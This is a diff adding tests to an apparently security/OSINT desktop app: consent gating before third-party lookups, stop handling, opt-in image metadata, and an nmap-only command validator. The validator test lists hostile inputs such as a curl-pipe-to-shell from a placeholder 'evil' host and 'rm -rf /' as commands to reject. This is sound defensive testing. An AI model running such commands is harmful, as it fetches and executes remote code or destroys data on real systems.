@@ -336,7 +336,7 @@ class TestRecommendationsStillReachThePanels:
 
         assert authorised == []
         assert "deepseek permission is off" in trace.status_label.text()
-        assert "Inspector" in trace.status_label.text()
+        assert "Paid provider access" in trace.status_label.text()
         assert trace.analyse_btn.isEnabled()
 
     def test_trace_local_balance_retry_bypasses_auto_routing_once(
@@ -1092,6 +1092,47 @@ class TestWorkspaceLayoutRegressions:
         assert trace.status_label.text() == "Saved search loaded."
         assert "no external sources were queried" in trace.activity_box.toPlainText()
 
+    @pytest.mark.parametrize("command,result,expected", [
+        ("Live Research · Domain", {"type": "domain", "query": "acme.com"}, "Domain"),
+        ("Live Research · IP Address", {"type": "ip", "query": "acme.com"}, "IP Address"),
+        ("Live Research · Email", {"type": "email", "query": "acme.com"}, "Email"),
+        ("Live Research · Exposure",
+         {"type": "exposure", "query": "acme.com", "target_type": "company",
+          "summary": {}}, "Company"),
+    ])
+    def test_reopening_a_live_save_restores_its_query_type(
+            self, win, monkeypatch, command, result, expected):
+        """A live save is titled "Live Research · Domain", which is not an item
+        of the type box, so the box kept whatever it showed before."""
+        import json
+
+        data = {
+            "agent": "osint", "backend": "public-sources",
+            "model": "selected-public-sources", "command": command,
+            "messages": [{"role": "user", "content": "acme.com"}],
+            "response": json.dumps({"sources_contacted": [], **result}),
+        }
+        path = Path("trace-live.json")
+        monkeypatch.setattr(win.history, "list_chats", lambda: [path])
+        monkeypatch.setattr(win.history, "load_chat", lambda _path: data)
+        trace = win.panels["osint"]
+        trace.type_box.setCurrentText("Phone")
+
+        win.saved_search_search.setText("")
+        win.load_saved_searches()
+        try:
+            win.open_selected_search(win.saved_search_list.item(0))
+
+            assert trace.type_box.currentText() == expected
+            assert trace.target_input.text() == "acme.com"
+            trail = trace.activity_box.toPlainText()
+            assert "stored live-source record" in trail
+            assert "query-planning" not in trail
+            assert "no external sources were queried" in trail
+        finally:
+            trace.type_box.setCurrentText("Auto-detect")   # the window is shared
+            trace.clear()
+
     def test_chat_width_is_bounded_only_when_the_workspace_is_ultrawide(self, win):
         win.center_widget.resize(2200, 1000)
         win.select_agent("chat")
@@ -1174,6 +1215,10 @@ class FakeAgentFactory:
     def __init__(self, success=True):
         self.created = []
         self.success = success
+        self.validation = (True, "OK")
+
+    def validate_spec(self, spec):
+        return self.validation
 
     def create_agent(self, spec):
         self.created.append(spec)
@@ -1501,6 +1546,10 @@ class FakeOsintAgent:
         from agents.osint_agent import OSINTAgent
         return OSINTAgent.validate_target(target, query_type)
 
+    def non_public_ip_reason(self, target):
+        from agents.osint_agent import OSINTAgent
+        return OSINTAgent.non_public_ip_reason(target)
+
 
 class FakeLookupWorker(QObject):
     progress_signal = Signal(str, str)
@@ -1535,6 +1584,10 @@ class FakeIdentityLookupWorker(FakeLookupWorker):
         self.sources = tuple(sources)
 
 
+class FakeExposureLookupWorker(FakeIdentityLookupWorker):
+    instances = []
+
+
 @pytest.fixture
 def trace(qapp, monkeypatch):
     """Trace built against a fake host — no `GodAI`, no window, no thread."""
@@ -1547,9 +1600,13 @@ def trace(qapp, monkeypatch):
     monkeypatch.setattr(
         OsintPanel, "identity_lookup_worker_class", FakeIdentityLookupWorker
     )
+    monkeypatch.setattr(
+        OsintPanel, "exposure_lookup_worker_class", FakeExposureLookupWorker
+    )
     FakeWorker.instances.clear()
     FakeLookupWorker.instances.clear()
     FakeIdentityLookupWorker.instances.clear()
+    FakeExposureLookupWorker.instances.clear()
 
     host = FakeHost()
     host.agent_instances["osint"] = FakeOsintAgent()
@@ -1644,7 +1701,7 @@ class TestTracePanel:
         monkeypatch.setenv("IPINFO_API_KEY", "tok")
         monkeypatch.setenv("CRIMINALIP_API_KEY", "cip")
         trace.type_box.setCurrentText("IP Address")
-        trace.target_input.setText("203.0.113.5")
+        trace.target_input.setText("8.8.8.8")
         trace.live_research()
         assert "Shodan InternetDB" in seen["text"]
         assert "IPinfo" in seen["text"]
@@ -1670,7 +1727,7 @@ class TestTracePanel:
         assert "AbuseIPDB" not in seen["text"]     # an IP-only source
 
         trace.type_box.setCurrentText("IP Address")
-        trace.target_input.setText("203.0.113.5")
+        trace.target_input.setText("8.8.8.8")
         trace.live_research()
         for label in ("AbuseIPDB", "GreyNoise", "VirusTotal", "AlienVault OTX",
                       "Shodan", "Censys"):
@@ -1707,7 +1764,7 @@ class TestTracePanel:
         monkeypatch.setattr(trace.sections, "show_sections",
                             lambda cards, raw=None: shown.update(cards=cards))
         trace._show_lookup_result({
-            "type": "ip", "query": "203.0.113.5", "sources_contacted": [],
+            "type": "ip", "query": "8.8.8.8", "sources_contacted": [],
             "abuse_reports": {"abuse_confidence": 87}, "shodan_host": {"ports": [22]},
         }, save=False)
         titles = [card[0] for card in shown["cards"]]
@@ -1723,10 +1780,11 @@ class TestTracePanel:
         assert "Breach databases (Snusbase)" in titles
         assert "Breaches and leaked data types (LeakCheck)" in titles
 
-    def test_company_consent_names_courtlistener(self, trace, monkeypatch):
-        """Company Live Research always contacts CourtListener, so the consent
-        text (and the audit line built from it) must name it. Regression: the
-        target was POSTed to CourtListener without disclosure."""
+    def test_company_consent_names_courtlistener_only_when_ticked(self, trace, monkeypatch):
+        """CourtListener has its own checkbox (off by default). The consent text,
+        and the audit line built from it, name it exactly when it is ticked.
+        Regression: the target was POSTed to CourtListener without disclosure,
+        and later on every company lookup without a choice."""
         seen = {}
         monkeypatch.setattr(
             QMessageBox, "question",
@@ -1734,6 +1792,11 @@ class TestTracePanel:
         )
         trace.type_box.setCurrentText("Company")
         trace.target_input.setText("Acme Ltd")
+        assert trace.courtlistener_box.isChecked() is False
+        trace.live_research()
+        assert "CourtListener" not in seen["text"]
+        assert "Treated as: Company" in seen["text"]
+        trace.courtlistener_box.setChecked(True)
         trace.live_research()
         assert "CourtListener" in seen["text"]
 
@@ -1772,7 +1835,7 @@ class TestTracePanel:
 
     def test_live_research_stop_retains_partial_results(
             self, trace, monkeypatch):
-        trace.target_input.setText("192.0.2.10")
+        trace.target_input.setText("8.8.4.4")
         monkeypatch.setattr(
             QMessageBox, "question", staticmethod(lambda *a, **k: QMessageBox.Yes)
         )
@@ -1781,7 +1844,7 @@ class TestTracePanel:
         trace.stop()
         assert worker.cancelled
         worker.finished_signal.emit({
-            "type": "ip", "query": "192.0.2.10", "cancelled": True,
+            "type": "ip", "query": "8.8.4.4", "cancelled": True,
             "whois": {"country": "ZZ"},
             "sources_contacted": [{"source": "WHOIS", "status": "checked"}],
         })
@@ -1872,11 +1935,11 @@ class TestTracePanel:
             QMessageBox, "question",
             staticmethod(lambda *a, **k: prompts.append(a[2]) or QMessageBox.Yes),
         )
-        trace.target_input.setText("192.0.2.10")
+        trace.target_input.setText("8.8.4.4")
         trace.live_research()
         assert "Team Cymru" in prompts[-1] and "DShield" in prompts[-1]
         FakeLookupWorker.instances[-1].finished_signal.emit({
-            "type": "ip", "query": "192.0.2.10",
+            "type": "ip", "query": "8.8.4.4",
             "network": {"asn": "AS64500"}, "attack_reports": {"reports": 4},
             "passive_dns": {"records": []},
             "sources_contacted": [{"source": "SANS DShield", "status": "checked"}],
@@ -2061,6 +2124,154 @@ class TestTracePanel:
         assert trace.analyse_btn.isEnabled() is True
         assert trace.stop_btn.isEnabled() is False
 
+    def test_a_stopped_plan_keeps_its_partial_text_and_is_not_an_error(self, trace):
+        """Stop used to leave the red "Request cancelled by user." box, drop the
+        partial text and (on a non-streaming reply) record the answer anyway."""
+        trace.analyse()
+        worker = trace.worker
+        worker.token_signal.emit("## QUERY STRUCTURE\npartial plan")
+        trace.stop()
+        # Whatever the cancelled thread still sends must not land.
+        worker.token_signal.emit(" late token")
+        worker.error_signal.emit("Request cancelled by user.")
+        worker.finished_signal.emit("late full answer")
+
+        assert trace.status_label.text() == "Stopped."
+        shown = trace.stream_box.toPlainText()
+        assert shown == "## QUERY STRUCTURE\npartial plan"
+        assert "ERROR" not in shown and trace.stream_box.isVisibleTo(trace)
+        calls = trace.host.calls
+        assert ("abandon", "osint", "cancelled") in calls
+        assert ("abandon", "osint", "error") not in calls
+        assert [c for c in calls if c[0] == "record"] == []
+        assert trace.analyse_btn.isEnabled() and not trace.stop_btn.isEnabled()
+
+    def test_a_cancel_error_that_arrives_without_stop_is_still_a_stop(self, trace):
+        trace.analyse()
+        trace.worker.token_signal.emit("partial")
+        trace.worker.error_signal.emit("Request cancelled by user.")
+        assert trace.status_label.text() == "Stopped."
+        assert trace.stream_box.toPlainText() == "partial"
+        assert ("abandon", "osint", "cancelled") in trace.host.calls
+        assert trace.analyse_btn.isEnabled() is True
+
+    def test_a_cancelled_non_streaming_reply_never_reports_finished(self):
+        from ui.workers import ChatWorker
+
+        holder = {}
+
+        def backend(*_args):
+            holder["worker"].cancel()      # Stop arrives while the reply is in hand
+            return "a whole reply"
+
+        worker = ChatWorker(backend, "ollama", "m", [], "p")
+        holder["worker"] = worker
+        finished, errors = [], []
+        worker.finished_signal.connect(finished.append)
+        worker.error_signal.connect(errors.append)
+        worker.run()
+        assert finished == [] and errors == []
+
+    def test_a_second_live_research_cannot_replace_a_running_worker(
+            self, trace, monkeypatch):
+        monkeypatch.setattr(
+            QMessageBox, "question", staticmethod(lambda *a, **k: QMessageBox.Yes))
+        trace.live_research()
+        first = trace.worker
+        trace.stop()
+        first.running = True           # the source in flight has not returned yet
+
+        # Stop must not hand the controls back while the worker is alive.
+        assert trace.live_btn.isEnabled() is False
+        assert trace.status_label.text().startswith("Stopping")
+        # A click that gets through anyway (shortcut, queued event) is refused.
+        trace.live_research()
+        assert trace.worker is first
+        assert len(FakeLookupWorker.instances) == 1
+
+        first.finished_signal.emit({
+            "type": "domain", "query": "acme.com", "cancelled": True,
+            "sources_contacted": [{"source": "WHOIS", "status": "checked"}],
+        })
+        assert trace.status_label.text() == "Stopped — partial results retained."
+        assert trace.live_btn.isEnabled() and trace.exposure_btn.isEnabled()
+        assert trace.analyse_btn.isEnabled() and not trace.stop_btn.isEnabled()
+
+    def test_a_second_exposure_check_cannot_replace_a_running_worker(
+            self, trace, monkeypatch):
+        monkeypatch.setattr(
+            trace, "_choose_exposure_sources", lambda target, kind: ("ransomware_live",))
+        trace.exposure_check()
+        first = trace.worker
+        assert first is FakeExposureLookupWorker.instances[-1]
+        trace.stop()
+        first.running = True
+
+        assert trace.exposure_btn.isEnabled() is False
+        trace.exposure_check()
+        trace.live_research()
+        assert trace.worker is first
+        assert len(FakeExposureLookupWorker.instances) == 1
+        assert FakeLookupWorker.instances == []
+
+        first.error_signal.emit("boom")        # the other way a worker ends
+        assert trace.exposure_btn.isEnabled() and trace.live_btn.isEnabled()
+
+    def test_the_exposure_worker_passes_an_empty_selection_through(self, monkeypatch):
+        """An empty tuple is "nothing selected"; the worker used to turn it into
+        None, which the provider reads as every default source."""
+        from providers import exposure_lookup
+        from ui.workers import ExposureLookupWorker
+
+        seen = []
+        monkeypatch.setattr(
+            exposure_lookup, "lookup",
+            lambda target, kind, **kwargs: seen.append(kwargs) or {"type": "exposure"})
+        ExposureLookupWorker("acme.com", "Domain", ()).run()
+        assert seen[0]["selected_sources"] == ()
+
+    def _exposure_verdict(self, trace, monkeypatch, **result):
+        shown = {}
+        monkeypatch.setattr(trace.sections, "show_sections",
+                            lambda cards, raw=None: shown.update(cards=dict(
+                                (c[0], c[1]) for c in cards)))
+        trace._show_lookup_result({
+            "type": "exposure", "query": "acme.com", "summary": {}, **result,
+        }, save=False)
+        return shown["cards"]["Exposure verdict"]
+
+    def test_the_exposure_verdict_is_clean_only_when_every_source_answered(
+            self, trace, monkeypatch):
+        answered = [{"source": "Ransomware.live", "status": "checked"},
+                    {"source": "Ahmia", "status": "checked"}]
+        clean = self._exposure_verdict(
+            trace, monkeypatch, sources_contacted=answered)
+        assert clean.startswith("No exposure found")
+
+        errored = self._exposure_verdict(trace, monkeypatch, sources_contacted=[
+            {"source": "Ransomware.live", "status": "checked"},
+            {"source": "Ahmia", "status": "error"}])
+        assert errored.startswith("Incomplete") and "Ahmia" in errored
+        assert "No exposure found" not in errored
+
+        stopped = self._exposure_verdict(
+            trace, monkeypatch, sources_contacted=answered[:1], cancelled=True)
+        assert stopped.startswith("Incomplete") and "stopped" in stopped
+
+        nothing = self._exposure_verdict(trace, monkeypatch, sources_contacted=[
+            {"source": "Ransomware.live", "status": "error"}])
+        assert nothing.startswith("Not checked")
+
+        none_ran = self._exposure_verdict(trace, monkeypatch, sources_contacted=[])
+        assert none_ran.startswith("Not checked")
+
+    def test_a_listing_still_outranks_the_incomplete_note(self, trace, monkeypatch):
+        verdict = self._exposure_verdict(
+            trace, monkeypatch,
+            summary={"on_ransomware_leak_site": True, "ransomware_victim_matches": 1},
+            sources_contacted=[{"source": "Ahmia", "status": "error"}])
+        assert verdict.startswith("⚠ On a ransomware leak site")
+
     def test_clear_empties_the_form_and_the_output(self, trace):
         trace.analyse()
         trace.worker.finished_signal.emit("## SUMMARY\nx")
@@ -2068,6 +2279,88 @@ class TestTracePanel:
         assert trace.target_input.text() == ""
         assert trace.stream_box.toPlainText() == ""
         assert trace.status_label.text() == "Idle"
+
+
+class TestDeclinedConsentContactsNothing:
+    """P0-8: every Trace path that sends a target to a third party starts no
+    worker, touches no socket and logs no lookup when the user says No."""
+
+    @pytest.fixture(autouse=True)
+    def _no_network(self, monkeypatch):
+        import socket
+
+        def refuse(*a, **k):
+            raise AssertionError("network touched after consent was declined")
+        monkeypatch.setattr(socket.socket, "connect", refuse)
+        monkeypatch.setattr(socket, "getaddrinfo", refuse)
+
+    @staticmethod
+    def _all_workers():
+        return (FakeLookupWorker.instances + FakeIdentityLookupWorker.instances
+                + FakeExposureLookupWorker.instances)
+
+    @pytest.mark.parametrize("qtype,target", [
+        ("Domain", "example.com"),
+        ("IP Address", "8.8.8.8"),
+        ("Username", "sapio1337"),
+        ("Company", "Acme Holdings"),
+    ])
+    def test_live_research_declined(self, trace, monkeypatch, qtype, target):
+        trace.type_box.setCurrentText(qtype)
+        trace.target_input.setText(target)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.No))
+        trace.live_research()
+        assert self._all_workers() == []
+        assert trace.status_label.text() == "Live Research cancelled before any lookup."
+        assert "Consent recorded" not in trace.activity_box.toPlainText()
+
+    def test_email_source_dialog_cancelled(self, trace, monkeypatch):
+        from PySide6.QtWidgets import QDialog
+        trace.type_box.setCurrentText("Email")
+        trace.target_input.setText("analyst@example.com")
+        monkeypatch.setattr(QDialog, "exec", lambda self: QDialog.Rejected)
+        trace.live_research()
+        assert self._all_workers() == []
+        assert trace.status_label.text() == "Live Research cancelled before any lookup."
+
+    def test_email_with_every_source_unticked_contacts_nothing(self, trace, monkeypatch):
+        from PySide6.QtWidgets import QCheckBox, QDialog
+        trace.type_box.setCurrentText("Email")
+        trace.target_input.setText("analyst@example.com")
+
+        def untick_and_accept(self):
+            for box in self.findChildren(QCheckBox):
+                box.setChecked(False)
+            return QDialog.Accepted
+        monkeypatch.setattr(QDialog, "exec", untick_and_accept)
+        monkeypatch.setattr(QMessageBox, "information", staticmethod(lambda *a, **k: None))
+        trace.live_research()
+        assert self._all_workers() == []
+
+    def test_exposure_check_cancelled(self, trace, monkeypatch):
+        from PySide6.QtWidgets import QDialog
+        trace.type_box.setCurrentText("Domain")
+        trace.target_input.setText("example.com")
+        monkeypatch.setattr(QDialog, "exec", lambda self: QDialog.Rejected)
+        trace.exposure_check()
+        assert self._all_workers() == []
+        assert trace.status_label.text() == "Exposure check cancelled before any lookup."
+
+    def test_exposure_check_with_every_source_unticked_contacts_nothing(
+            self, trace, monkeypatch):
+        from PySide6.QtWidgets import QCheckBox, QDialog
+        trace.type_box.setCurrentText("Domain")
+        trace.target_input.setText("example.com")
+
+        def untick_and_accept(self):
+            for box in self.findChildren(QCheckBox):
+                box.setChecked(False)
+            return QDialog.Accepted
+        monkeypatch.setattr(QDialog, "exec", untick_and_accept)
+        monkeypatch.setattr(QMessageBox, "information", staticmethod(lambda *a, **k: None))
+        trace.exposure_check()
+        assert self._all_workers() == []
 
 
 class TestTraceSectionParsing:
@@ -2097,6 +2390,16 @@ class TestTraceSectionParsing:
     def test_headings_are_matched_case_insensitively(self):
         from ui.panels.osint import OsintPanel
         assert OsintPanel.parse_sections("## google dorks\nx")["dorks"] == "x"
+
+    def test_the_real_summary_header_leaves_no_remnant_in_the_card(self):
+        """The prompt asks for "## SUMMARY & NEXT STEPS"; the card began
+        with "& NEXT STEPS" because the rest of the header line was kept."""
+        from ui.panels.osint import OsintPanel
+        parsed = OsintPanel.parse_sections(
+            "## PUBLIC SOURCES\nwhois\n## SUMMARY & NEXT STEPS\nCheck the registrar.\nThen the dorks."
+        )
+        assert parsed["summary"] == "Check the registrar.\nThen the dorks."
+        assert parsed["sources"] == "whois"
 
 
 class TestWindowStopButton:
@@ -2174,6 +2477,43 @@ SPEC = '{"name": "fwreview", "label": "Firewall Review"}'
 
 
 class TestForgePanel:
+
+    def test_an_invalid_spec_cannot_be_approved(self, forge):
+        forge.host.agent_factory.validation = (False, "Agent name collides with built-in 'chat'.")
+        forge.analyze_idea()
+        forge.worker.finished_signal.emit(SPEC)
+        assert forge.approve_btn.isEnabled() is False
+        assert forge.reject_btn.isEnabled() is True
+        assert "cannot be created as written" in forge.log.toPlainText().lower()
+        assert "collides" in forge.sections._raw or "collides" in forge.log.toPlainText()
+
+    def test_a_valid_spec_enables_approve(self, forge):
+        forge.analyze_idea()
+        forge.worker.finished_signal.emit(SPEC)
+        assert forge.approve_btn.isEnabled() is True
+
+    def test_review_cards_show_model_text_as_plain_text(self, forge):
+        from PySide6.QtCore import Qt
+        from PySide6.QtWidgets import QLabel
+        forge.analyze_idea()
+        forge.worker.finished_signal.emit(SPEC)
+        labels = [w for w in forge.sections.findChildren(QLabel)
+                  if w.objectName() in ("SectionBody", "SectionMono")]
+        assert labels
+        assert all(w.textFormat() == Qt.PlainText for w in labels)
+
+    def test_no_message_promises_a_chat_tool(self, forge, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        texts = []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: texts.append(a[2]) or QMessageBox.Yes))
+        monkeypatch.setattr(QMessageBox, "information",
+                            staticmethod(lambda *a, **k: texts.append(a[2])))
+        forge.analyze_idea()
+        forge.worker.finished_signal.emit(SPEC)
+        forge.approve_spec()
+        everything = "\n".join(texts) + forge.log.toPlainText()
+        assert "Chat tool" not in everything and "Settings → Tools" not in everything
 
     def test_it_builds_without_a_window_and_starts_hidden(self, forge):
         assert forge.isHidden() is True
@@ -2302,9 +2642,11 @@ class FakeBugBountyAgent:
     def __init__(self):
         self.calls = []
 
-    def build_messages(self, target, program, scope_type, findings, nmap_output):
+    def build_messages(self, target, program, scope_type, findings, nmap_output, severity=""):
         self.calls.append((target, program, scope_type, findings, nmap_output))
-        return [{"role": "user", "content": target}]
+        self.severity = severity
+        # Shaped like the real agent: the request carries far more than the target.
+        return [{"role": "user", "content": "\n".join(filter(None, [target, findings, nmap_output]))}]
 
 
 REPORT = (
@@ -2459,6 +2801,92 @@ class TestBugSprayPanel:
         spray.run_nmap()
         assert [c for c in spray.host.calls if c[0] == "authorize"] == []
 
+    # ── nmap runner bounds ─────────────────────────────────────────────
+
+    def test_only_nmap_can_be_run_from_the_command_box(self, spray, monkeypatch):
+        from ui.panels.bug_bounty import BugBountyPanel
+        monkeypatch.setattr("ui.panels.bug_bounty.shutil.which", lambda name: "/usr/bin/nmap")
+        assert BugBountyPanel._nmap_argv("nmap -sV --open 10.0.0.1") == (
+            "/usr/bin/nmap", ["-sV", "--open", "10.0.0.1"])
+        assert BugBountyPanel._nmap_argv("/opt/homebrew/bin/nmap -p 80 'host name'")[1] == ["-p", "80", "host name"]
+        for bad in ("curl http://evil/x | sh", "rm -rf /", "bash -c nmap", "nmapx 10.0.0.1"):
+            with pytest.raises(ValueError):
+                BugBountyPanel._nmap_argv(bad)
+        spray.nmap_cmd_input.setText("curl http://evil/x")
+        spray.run_nmap()
+        assert spray._nmap_process is None
+        assert "Only nmap" in spray.nmap_output.toPlainText()
+
+    def test_missing_nmap_is_reported_before_any_process(self, spray, monkeypatch):
+        monkeypatch.setattr("ui.panels.bug_bounty.shutil.which", lambda name: None)
+        monkeypatch.setattr("ui.panels.bug_bounty.Path.is_file", lambda self: False)
+        spray.nmap_cmd_input.setText("nmap -sV 10.0.0.1")
+        spray.run_nmap()
+        assert spray._nmap_process is None
+        assert "not installed" in spray.nmap_output.toPlainText()
+        assert spray.nmap_run_btn.isEnabled() is True
+
+    def test_a_start_failure_releases_the_buttons(self, spray):
+        from PySide6.QtCore import QProcess
+        spray.set_busy(spray.nmap_run_btn, spray.nmap_stop_btn, True)
+        spray._nmap_error(QProcess.FailedToStart)
+        assert spray.nmap_run_btn.isEnabled() is True
+        assert "could not be started" in spray.nmap_output.toPlainText()
+
+    def test_scan_output_is_capped_and_the_scan_killed(self, spray):
+        import ui.panels.bug_bounty as mod
+        class Proc:
+            def __init__(self, chunk):
+                self.chunk, self.killed = chunk, False
+            def readAll(self):
+                class B:
+                    def __init__(s, d): s.d = d
+                    def data(s): return s.d
+                return B(self.chunk)
+            def kill(self):
+                self.killed = True
+        spray._nmap_scan_text = ""
+        spray._nmap_truncated = False
+        proc = Proc(b"x" * (mod.NMAP_OUTPUT_LIMIT + 100))
+        spray._nmap_process = proc
+        spray._nmap_read()
+        assert len(spray.nmap_scan_text) == mod.NMAP_OUTPUT_LIMIT
+        assert proc.killed is True
+        assert "capped" in spray.nmap_output.toPlainText()
+
+    def test_the_model_sees_scanner_output_not_the_panel_markers(self, spray):
+        spray.nmap_output.setPlainText("[Running] nmap -sV 10.0.0.1\n")
+        spray._nmap_scan_text = "22/tcp open ssh OpenSSH 9.6\n"
+        spray.nmap_output.insertPlainText(spray._nmap_scan_text + "\n[Done]")
+        spray.analyse()
+        nmap_arg = spray.host.agent_instances["bug_bounty"].calls[-1][4]
+        assert nmap_arg == "22/tcp open ssh OpenSSH 9.6"
+        assert "[Running]" not in nmap_arg and "[Done]" not in nmap_arg
+
+    def test_authorisation_prices_the_whole_request(self, spray):
+        spray.findings_input.setPlainText("GET /search?q=<script> ... " * 40)
+        spray.analyse()
+        auth = [c for c in spray.host.calls if c[0] == "authorize"][-1]
+        assert len(auth[4]) > 1000                      # the full prompt text
+        assert auth[6] == spray.target_input.text()     # the label stays the target
+
+    def test_shutdown_kills_a_running_scan(self, spray):
+        from PySide6.QtCore import QProcess
+        class Proc:
+            def __init__(self):
+                self.killed, self.waited = False, False
+            def state(self):
+                return QProcess.Running
+            def kill(self):
+                self.killed = True
+            def waitForFinished(self, _ms):
+                self.waited = True
+                return True
+        proc = Proc()
+        spray._nmap_process = proc
+        spray.shutdown()
+        assert proc.killed and proc.waited
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # 6. Bloodhound
@@ -2491,9 +2919,10 @@ class FakeCollectionWorker(QObject):
     error_signal = Signal(str)
     instances = []
 
-    def __init__(self, collect, target, target_type, scope):
+    def __init__(self, collect, target, target_type, scope, options=None):
         super().__init__()
         self.args = (collect, target, target_type, scope)
+        self.options = dict(options or {})
         self.cancelled = False
         self.running = True
         FakeCollectionWorker.instances.append(self)
@@ -2543,6 +2972,67 @@ class TestBloodhoundPanel:
         assert filters.extensions == (".pdf", ".docx")
         assert filters.min_size == int(1.5 * 1024 * 1024)
         assert filters.max_size == 3 * 1024 * 1024
+
+    # ── Stop, close and Reset reach a running file search ────────────────
+
+    class _FakeFileSearchWorker:
+        def __init__(self):
+            self.running, self.cancelled, self.waited, self.terminated = True, False, False, False
+        def isRunning(self):
+            return self.running
+        def cancel(self):
+            self.cancelled = True
+        def wait(self, _ms):
+            self.waited = True
+            self.running = False
+            return True
+        def terminate(self):
+            self.terminated = True
+
+    def test_a_running_file_search_counts_as_running(self, hound):
+        assert hound.is_running() is False
+        hound._file_search_worker = self._FakeFileSearchWorker()
+        assert hound.is_running() is True
+
+    def test_stop_cancels_a_running_file_search(self, hound):
+        worker = self._FakeFileSearchWorker()
+        hound._file_search_worker = worker
+        hound.stop()
+        assert worker.cancelled is True
+
+    def test_shutdown_cancels_and_joins_the_file_search(self, hound):
+        worker = self._FakeFileSearchWorker()
+        hound._file_search_worker = worker
+        hound.shutdown()
+        assert worker.cancelled and worker.waited and not worker.terminated
+
+    def test_shutdown_abandons_an_authorised_collection(self, hound):
+        hound._collecting = True
+        hound.shutdown()
+        assert ("abandon", "osint_heavy", "cancelled") in hound.host.calls
+
+    def test_shutdown_is_what_the_app_calls_on_close(self, hound):
+        from ui.dialogs import shutdown_panels
+        worker = self._FakeFileSearchWorker()
+        hound._file_search_worker = worker
+        shutdown_panels(type("App", (), {"panels": {"osint_heavy": hound}})())
+        assert worker.waited is True
+
+    def test_remote_results_reveal_by_copying_the_path(self, hound, monkeypatch):
+        from services.local_file_search import FileMatch, FileSearchReport
+        from PySide6.QtGui import QGuiApplication
+        from PySide6.QtWidgets import QMessageBox
+        hound.file_source_box.setCurrentText("Remote SSH machine")
+        report = FileSearchReport(matches=[FileMatch(
+            name="notes.txt", path="/srv/archive/notes.txt", extension=".txt",
+            size=10, modified=datetime(2026, 9, 7, 12, 30))])
+        hound._populate_file_results(report)
+        warned = []
+        monkeypatch.setattr(QMessageBox, "warning", staticmethod(lambda *a, **k: warned.append(a)))
+        hound.reveal_file_result(0, 1)
+        assert warned == []                                  # no "File Not Found"
+        assert QGuiApplication.clipboard().text() == "/srv/archive/notes.txt"
+        assert "copied" in hound.file_status.text()
 
     def test_file_results_show_path_type_size_and_modified_date(self, hound):
         from services.local_file_search import FileMatch, FileSearchReport
@@ -2646,15 +3136,29 @@ class TestBloodhoundPanel:
         assert hound.threat_bar.value() == 0
         assert hound.image_label.text() == "No image selected"
 
-    def test_an_attached_image_puts_its_metadata_in_the_prompt(self, hound, tmp_path):
+    def test_an_attached_image_puts_its_metadata_in_the_prompt_when_opted_in(self, hound, tmp_path):
         # No EXIF in a text file — the point is that the panel sends *something*
-        # about the image rather than silently dropping it.
+        # about the image rather than silently dropping it, once the operator
+        # has ticked the box.
         fake = tmp_path / "target.jpg"
         fake.write_text("not really a jpeg")
         hound.set_image(str(fake))
+        hound.send_exif_checkbox.setChecked(True)
         hound.investigate()
         metadata = hound.host.agent_instances["osint_heavy"].calls[-1][4]
         assert "No EXIF metadata could be extracted" in metadata
+        assert "target.jpg" not in metadata            # the file name never travels
+
+    def test_image_metadata_stays_local_unless_opted_in(self, hound, tmp_path):
+        # The Bloodhound lesson: image metadata reaches a model only when
+        # explicitly approved. The box ships unticked.
+        fake = tmp_path / "target.jpg"
+        fake.write_text("not really a jpeg")
+        hound.set_image(str(fake))
+        assert hound.send_exif_checkbox.isChecked() is False
+        hound.investigate()
+        assert hound.host.agent_instances["osint_heavy"].calls[-1][4] == ""
+        assert hound.exif_display.toPlainText()        # still shown in the panel
 
     def test_no_image_means_no_metadata_in_the_prompt(self, hound):
         hound.investigate()
@@ -2677,6 +3181,57 @@ class TestBloodhoundPanel:
         monkeypatch.setattr(type(hound), "collection_worker_class", FakeCollectionWorker)
         FakeCollectionWorker.instances.clear()
         return hound
+
+    def test_public_sources_are_named_and_need_consent(self, collecting, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        agent = collecting.host.agent_instances["osint_heavy"]
+        agent.planned_sources = lambda target, target_type, scope: ["WHOIS", "crt.sh"]
+        asked = []
+
+        def question(parent, title, text, buttons, default=None):
+            asked.append((text, default))
+            return QMessageBox.No
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(question))
+        collecting.investigate()
+        (text, default), = asked
+        assert "acme.com" in text and "WHOIS" in text and "crt.sh" in text
+        assert default == QMessageBox.No
+        assert FakeCollectionWorker.instances == []          # nothing contacted
+        assert FakeWorker.instances == []                    # no model call
+        assert ("abandon", "osint_heavy", "cancelled") in collecting.host.calls
+        assert "Cancelled" in collecting.status_label.text()
+        assert collecting.investigate_btn.isEnabled() is True
+
+    def test_consent_given_starts_collection(self, collecting, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        agent = collecting.host.agent_instances["osint_heavy"]
+        agent.planned_sources = lambda target, target_type, scope: ["WHOIS"]
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        collecting.investigate()
+        assert len(FakeCollectionWorker.instances) == 1
+
+    def test_a_type_with_no_sources_asks_nothing(self, collecting, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        agent = collecting.host.agent_instances["osint_heavy"]
+        agent.planned_sources = lambda target, target_type, scope: []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: pytest.fail("asked for nothing")))
+        collecting.investigate()
+        assert len(FakeCollectionWorker.instances) == 1
+
+    def test_the_assembled_prompt_is_budget_checked_before_the_model_call(self, collecting):
+        seen = []
+        collecting.host.recheck_budget = (
+            lambda agent, provider, model, prompt, request_id=None: seen.append(prompt) or False)
+        collecting.investigate()
+        FakeCollectionWorker.instances[-1].finished_signal.emit(
+            [{"type": "domain", "whois": {"registrar": "Example Registrar"}}])
+        assert FakeWorker.instances == []                    # blocked before sending
+        assert seen == ["acme.com"]                           # the fake agent's whole prompt
+        assert ("abandon", "osint_heavy", "blocked") in collecting.host.calls
+        assert "budget" in collecting.status_label.text().lower()
+        assert collecting.investigate_btn.isEnabled() is True
 
     def test_the_guard_runs_before_any_public_source_is_contacted(self, collecting):
         collecting.host.authorized = False
@@ -2789,8 +3344,15 @@ class FakeVpnAgent:
 
 
 @pytest.fixture
-def tunnel(qapp, monkeypatch):
+def tunnel(qapp, monkeypatch, tmp_path):
     import ui.panels.vpn as vpn_mod
+    from services import vpn_execution
